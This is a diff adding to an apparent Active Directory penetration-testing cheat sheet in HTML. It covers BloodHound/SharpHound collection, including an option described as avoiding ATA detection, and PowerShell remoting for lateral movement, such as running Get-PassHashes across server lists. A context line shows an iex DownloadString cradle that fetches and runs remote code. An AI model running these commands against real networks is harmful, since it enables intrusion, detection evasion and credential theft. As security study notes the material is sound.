@@ -509,6 +509,58 @@ PS> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<ip
 
 <a href="https://github.com/BloodHoundAD/BloodHound">bloodhound tool</a> 
 
+<b>usage:</b>
+
+import sharphound.ps1
+
+. C:\path\to\file\sharphound.ps1
+
+PS> Invoke-BloodHound -CollectionMethod All -Verbose
+
+to avoid detections like ATA [-ExcludeDC]
+
+PS> Invoke-BloodHound -CollectionMethod All -ExcludeDC
+
+<b>-LATERAL MOVEMENT-</b>
+powershell remoting
+
+ONE-TO-ONE | ONE-TO-MANY
+
+<b>::: one to one</b>
+
+PSSession
+
+- interactive
+- runs in a new process (wsmprovhost)
+- stateful
+
+PS> New-PSSession
+PS> Enter-PSSession
+
+<b>::: one to many</b>
+
+- non-interactive
+- execute command pararelly
+
+PS> Invoke-Command
+
+**
+
+<b>::: use to execute commands or scriptblock</b>
+
+PS> Invoke-Command –Scriptblock{Get-Process} -ComputerName(Get-Content <list_of_servers>)
+
+<b>::: use to execute script from file</b>
+
+PS> Invoke-Command –FilePathC:\scripts\Get-PassHashes.ps1 -ComputerName(Get-Content <list_of_servers>)
+
+<b>::: execute locally loaded function on the remote machines</b>
+
+PS> Invoke-Command -ScriptBlock${function:Get-PassHashes} -ComputerName(Get-Content <list_of_servers>)
+
+<b>::: execute "Stateful" commands using Invoke-Command</b>
+
+PS> $Sess = New-PSSession –Computername <hostname> Invoke-Command –Session $Sess –ScriptBlock{$Proc=Get-Process} Invoke-Command –Session $Sess –ScriptBlock{$Proc.Name}
 
 </center>
 </body>
